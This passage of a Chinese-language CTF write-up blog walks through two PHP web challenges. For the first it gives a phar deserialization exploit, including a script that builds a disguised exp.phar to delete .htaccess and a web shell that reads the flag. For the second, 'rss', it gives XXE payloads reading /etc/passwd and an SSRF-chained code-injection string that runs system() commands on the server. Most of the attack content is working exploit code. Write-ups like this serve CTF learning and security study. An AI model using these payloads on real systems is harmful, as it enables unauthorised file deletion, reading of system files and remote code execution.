</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">view_detail</span>(){
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i&#39;</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filepath</span>)){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;nonono~&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        $mine <span style="color:#f92672">=</span> <span style="color:#a6e22e">mime_content_type</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filepath</span>);
</span></span><span style="display:flex;"><span>        $store_path <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">open</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filename</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filepath</span>);
</span></span><span style="display:flex;"><span>        $res[<span style="color:#e6db74">&#39;mine&#39;</span>] <span style="color:#f92672">=</span> $mine;
</span></span><span style="display:flex;"><span>        $res[<span style="color:#e6db74">&#39;store_path&#39;</span>] <span style="color:#f92672">=</span> $store_path;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $res;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">open</span>($filename, $filepath){
</span></span><span style="display:flex;"><span>        $res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$filename</span><span style="color:#e6db74"> is in </span><span style="color:#e6db74">$filepath</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $res;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __destruct()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">checker</span>)){
</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">checker</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">upload_file</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Admin</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $size;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $checker;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $file_tmp;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $filename;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $upload_dir;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $content_check;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __construct($filename, $file_tmp, $size)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">upload_dir</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;sandbox/&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">md5</span>($_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>]);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">file_exists</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">upload_dir</span>)){
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mkdir</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">upload_dir</span>, <span style="color:#ae81ff">0777</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_file</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">upload_dir</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/.htaccess&#39;</span>)){
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">file_put_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">upload_dir</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/.htaccess&#39;</span>, <span style="color:#e6db74">&#39;lolololol, i control all&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">size</span> <span style="color:#f92672">=</span> $size;
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> $filename;
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_tmp</span> <span style="color:#f92672">=</span> $file_tmp;
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">content_check</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Check</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_tmp</span>);
</span></span><span style="display:flex;"><span>        $profile <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Profile</span>();
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">checker</span> <span style="color:#f92672">=</span> $profile<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">is_admin</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">upload_file</span>(){
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">checker</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;u r not admin&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">content_check</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">check</span>();
</span></span><span style="display:flex;"><span>        $tmp <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;.&#34;</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filename</span>);
</span></span><span style="display:flex;"><span>        $ext <span style="color:#f92672">=</span> <span style="color:#a6e22e">end</span>($tmp);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">size</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">204800</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;your file is too big&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">move_uploaded_file</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_tmp</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">upload_dir</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">md5</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filename</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">.</span>$ext);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __call($name, $arguments)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Profile</span>{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $username;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $password;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $admin;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">is_admin</span>(){
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> $_SESSION[<span style="color:#e6db74">&#39;username&#39;</span>];
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> $_SESSION[<span style="color:#e6db74">&#39;password&#39;</span>];
</span></span><span style="display:flex;"><span>        $secret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;********&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#f92672">&amp;&amp;</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">password</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;admin&#34;</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ($_COOKIE[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#a6e22e">md5</span>($secret<span style="color:#f92672">.</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span><span style="color:#f92672">.</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">password</span>)){
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __call($name, $arguments)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">admin</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">open</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">password</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>利用链:</p>
<ul>
<li>上传exp.phar</li>
<li>绕过waf使用<code>php://filter/read=convert.base64-encode/resource=phar://exp.phar</code>触发phar让他反序列中file类的destruct, upload_file触发profile的__call函数, 触发open函数</li>
<li>profile-&gt;admin声明为ZipArchive类, 利用这个原生类的同名函数open来删除原有的.htaccess, 删除完之后再传一个shell就可以了</li>
</ul>
<p>exp:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">File</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $filename;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $filepath;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $checker;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __construct()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">checker</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Admin</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Admin</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $size;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $checker;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $file_tmp;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $filename;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $upload_dir;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $file_error;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $content_check;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $obj;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $filepath;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __construct()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">checker</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">size</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1024</span>;
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">content_check</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Profile</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Profile</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $username;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $password;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $admin;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __construct()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">admin</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ZipArchive</span>();
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/var/www/html/sandbox/76c98b2e4f0f7a9a467bcf459b36ab5c/.htaccess&#34;</span>;
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ZipArchive</span><span style="color:#f92672">::</span><span style="color:#a6e22e">OVERWRITE</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">unlink</span>(<span style="color:#e6db74">&#34;exp.phar&#34;</span>);
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Phar</span>(<span style="color:#e6db74">&#39;exp.phar&#39;</span>);
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">startBuffering</span>();
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">setStub</span>(<span style="color:#e6db74">&#39;GIF89a&#39;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;</span>);
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">addFromString</span>(<span style="color:#e6db74">&#39;test.txt&#39;</span>,<span style="color:#e6db74">&#39;test&#39;</span>);
</span></span><span style="display:flex;"><span>$object <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">File</span>();
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">setMetadata</span>($object);
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">stopBuffering</span>();
</span></span></code></pre></div><p>shell.php</p>
<pre tabindex="0"><code>&lt;?php
echo file_get_contents(&#39;/flag&#39;);
</code></pre><h2 id="rss">rss<a hidden class="anchor" aria-hidden="true" href="#rss">#</a></h2>
<p>data protocol format:</p>
<pre tabindex="0"><code>data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt;
</code></pre><p>说是php对mine type不敏感, 那么可以这样子写</p>
<pre tabindex="0"><code>data://baidu.com/plain;base64,xxxxxxxxx==
</code></pre><p>然后看rss的定义:</p>
<blockquote>
<p>What is RSS?</p>
<p>It is a format to share data, defined in the <a href="https://www.xul.fr/en-xml.php">1.0 version</a> of XML. You can deliver information in this format et one can get this information, and information from other various sources, in this format. Information provided by a website in an XML file is called an RSS feed.
Recent browsers can read directly RSS files, but a special <strong>RSS reader</strong> or <strong>aggregator</strong> may be used too.</p>
</blockquote>
<p>所以所谓的rss就是xml.</p>
<p>尝试测试</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;</span>]&gt;
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;rss</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;2.0&#34;</span> <span style="color:#a6e22e">xmlns:atom=</span><span style="color:#e6db74">&#34;http://www.w3.org/2005/Atom&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;channel&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;title&gt;</span>The Blog<span style="color:#f92672">&lt;/title&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;link&gt;</span>http://example.com/<span style="color:#f92672">&lt;/link&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;description&gt;</span>A blog about things<span style="color:#f92672">&lt;/description&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;lastBuildDate&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span style="color:#f92672">&lt;/lastBuildDate&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;item&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;title&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/title&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;link&gt;</span>http://example.com<span style="color:#f92672">&lt;/link&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;description&gt;</span>a post<span style="color:#f92672">&lt;/description&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;author&gt;</span>author@example.com<span style="color:#f92672">&lt;/author&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;pubDate&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span style="color:#f92672">&lt;/pubDate&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/item&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/channel&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/rss&gt;</span>
</span></span></code></pre></div><p>将上述内容base64编码之后用之前的data协议传入进去, 触发成功.</p>
<p>接下来就读取源码就行了.</p>
<p>不熟悉MVC架构&hellip;.读完index.php之后就不知道读什么&hellip;..</p>
<p>index.php 中有routes.php, 根据routes.php再去读controllers/Admin.php, 然后又去读views/Admin.php</p>
<p>然后关键代码</p>
<pre tabindex="0"><code>usort($data, create_function(&#39;$a, $b&#39;, &#39;return strcmp($a-&gt;&#39;.$order.&#39;,$b-&gt;&#39;.$order.&#39;);&#39;));
</code></pre><p>直接拼接</p>
<p>exp.xml</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;php://filter/read=convert.base64-encode/resource=http://127.0.0.1/rss_in_order?rss_url=https://view.news.qq.com/index2010/zhuanti/ztrss.xml&amp;order=%24b%2C%24a)%3B%7Dsystem(&#39;cat%20%2Fflag_eb8ba2eb07702e69963a7d6ab8669134&#39;)%3B%2F%2F&#34; &gt;</span>]&gt;
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;rss</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;2.0&#34;</span> <span style="color:#a6e22e">xmlns:atom=</span><span style="color:#e6db74">&#34;http://www.w3.org/2005/Atom&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;channel&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;title&gt;</span>The Blog<span style="color:#f92672">&lt;/title&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;link&gt;</span>http://example.com/<span style="color:#f92672">&lt;/link&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;description&gt;</span>A blog about things<span style="color:#f92672">&lt;/description&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;lastBuildDate&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span style="color:#f92672">&lt;/lastBuildDate&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;item&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;title&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/title&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;link&gt;</span>http://example.com<span style="color:#f92672">&lt;/link&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;description&gt;</span>a post<span style="color:#f92672">&lt;/description&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;author&gt;</span>author@example.com<span style="color:#f92672">&lt;/author&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;pubDate&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span style="color:#f92672">&lt;/pubDate&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/item&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/channel&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/rss&gt;</span>
</span></span></code></pre></div><pre tabindex="0"><code>$b,$a);}system(&#39;cat /flag_eb8ba2eb07702e69963a7d6ab8669134&#39;);&#34;
</code></pre>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://ch3n9w.cpolar.cn/posts/ctf-roarctfwp/">
    <span class="title">« Prev</span>
    <br>
    <span>RoarCTF 2019复现</span>
  </a>
  <a class="next" href="https://ch3n9w.cpolar.cn/posts/sec-php%E7%9A%84%E4%B8%A4%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
    <span class="title">Next »</span>
    <br>
    <span>php session反序列化</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2024 <a href="https://ch3n9w.cpolar.cn/">ch3n9w の 超元域</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
